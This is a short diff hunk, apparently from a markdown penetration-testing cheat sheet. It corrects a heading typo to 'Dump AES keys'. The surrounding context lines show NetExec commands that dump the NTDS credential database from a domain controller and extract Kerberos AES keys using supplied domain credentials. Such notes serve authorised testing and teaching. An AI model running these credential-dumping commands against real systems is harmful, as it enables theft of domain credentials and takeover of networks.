@@ -1114,7 +1114,7 @@ NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> 
 NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds --user <AD_user>
 ```
 
-#### Dump a aeskeys
+#### Dump AES keys
 ```shell
 NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds --kerberos-keys
 ```
